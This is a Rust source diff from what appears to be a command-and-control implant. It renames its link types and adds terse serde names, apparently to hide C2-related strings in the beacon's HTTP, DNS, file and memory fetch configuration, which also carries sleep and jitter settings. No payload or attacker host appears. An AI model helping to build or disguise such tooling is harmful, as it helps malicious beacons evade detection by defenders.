@@ -31,14 +31,19 @@ use log::info;
 
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub enum Link {
+pub enum Lk {
+    #[serde(rename = "hh")]
     HTTP(HTTPLink),
+    #[serde(rename = "dd")]
     DNS(DNSLink),
+    #[serde(rename = "ff")]
     FILE(FileLink),
+    #[serde(rename = "me")]
     MEMORY(MemoryLink),
-    HTTPPostC2(HTTPPostC2Link),
+    #[serde(rename = "hhp")]
+    HTTPP(HTTPP),
 }
-impl Link {
+impl Lk {
     pub fn print_link_compact(&self) {
         info!("{:?}", serde_json::to_string(self).unwrap_or_default());
     }
@@ -137,7 +142,7 @@ pub struct MemoryLink {
 }
 
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct HTTPPostC2Link {
+pub struct HTTPP {
     pub url: String,
     pub dataoperation: Vec<DO>,
     pub dataoperation_post: Vec<DO>,
@@ -200,14 +205,14 @@ pub trait LinkFetch {
     }
 }
 
-impl LinkFetch for Link {
+impl LinkFetch for Lk {
     fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
-            Link::HTTP(link) => link.download_data(config),
-            Link::DNS(link) => link.download_data(config),
-            Link::FILE(link) => link.download_data(config),
-            Link::MEMORY(link) => link.download_data(config),
-            Link::HTTPPostC2(link) => link.download_data(config),
+            Lk::HTTP(link) => link.download_data(config),
+            Lk::DNS(link) => link.download_data(config),
+            Lk::FILE(link) => link.download_data(config),
+            Lk::MEMORY(link) => link.download_data(config),
+            Lk::HTTPP(link) => link.download_data(config),
         }
     }
 
@@ -220,49 +225,49 @@ impl LinkFetch for Link {
         config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
-            Link::HTTP(link) => link.download_data(config),
-            Link::DNS(link) => link.download_data(config),
-            Link::FILE(link) => link.download_data(config),
-            Link::MEMORY(link) => link.download_data(config),
-            Link::HTTPPostC2(link) => link.download_data_post(session_id, run_data, config),
+            Lk::HTTP(link) => link.download_data(config),
+            Lk::DNS(link) => link.download_data(config),
+            Lk::FILE(link) => link.download_data(config),
+            Lk::MEMORY(link) => link.download_data(config),
+            Lk::HTTPP(link) => link.download_data_post(session_id, run_data, config),
         }
     }
 
     fn get_target(&self) -> String {
         match &self {
-            Link::HTTP(link) => link.get_target(),
-            Link::DNS(link) => link.get_target(),
-            Link::FILE(link) => link.get_target(),
-            Link::MEMORY(link) => link.get_target(),
-            Link::HTTPPostC2(link) => link.get_target(),
+            Lk::HTTP(link) => link.get_target(),
+            Lk::DNS(link) => link.get_target(),
+            Lk::FILE(link) => link.get_target(),
+            Lk::MEMORY(link) => link.get_target(),
+            Lk::HTTPP(link) => link.get_target(),
         }
     }
     fn get_dataoperation(&self) -> Vec<DO> {
         match &self {
-            Link::HTTP(link) => link.get_dataoperation(),
-            Link::DNS(link) => link.get_dataoperation(),
-            Link::FILE(link) => link.get_dataoperation(),
-            Link::MEMORY(link) => link.get_dataoperation(),
-            Link::HTTPPostC2(link) => link.get_dataoperation(),
+            Lk::HTTP(link) => link.get_dataoperation(),
+            Lk::DNS(link) => link.get_dataoperation(),
+            Lk::FILE(link) => link.get_dataoperation(),
+            Lk::MEMORY(link) => link.get_dataoperation(),
+            Lk::HTTPP(link) => link.get_dataoperation(),
         }
     }
 
     fn get_sleep(&self) -> u64 {
         match &self {
-            Link::HTTP(link) => link.get_sleep(),
-            Link::DNS(link) => link.get_sleep(),
-            Link::FILE(link) => link.get_sleep(),
-            Link::MEMORY(link) => link.get_sleep(),
-            Link::HTTPPostC2(link) => link.get_sleep(),
+            Lk::HTTP(link) => link.get_sleep(),
+            Lk::DNS(link) => link.get_sleep(),
+            Lk::FILE(link) => link.get_sleep(),
+            Lk::MEMORY(link) => link.get_sleep(),
+            Lk::HTTPP(link) => link.get_sleep(),
         }
     }
     fn get_jitt(&self) -> u64 {
         match &self {
-            Link::HTTP(link) => link.get_jitt(),
-            Link::DNS(link) => link.get_jitt(),
-            Link::FILE(link) => link.get_jitt(),
-            Link::MEMORY(link) => link.get_jitt(),
-            Link::HTTPPostC2(link) => link.get_jitt(),
+            Lk::HTTP(link) => link.get_jitt(),
+            Lk::DNS(link) => link.get_jitt(),
+            Lk::FILE(link) => link.get_jitt(),
+            Lk::MEMORY(link) => link.get_jitt(),
+            Lk::HTTPP(link) => link.get_jitt(),
         }
     }
 }
@@ -425,7 +430,7 @@ pub struct PostToC2 {
     pub sign_bytes: Vec<u8>,
 }
 
-impl LinkFetch for HTTPPostC2Link {
+impl LinkFetch for HTTPP {
     fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
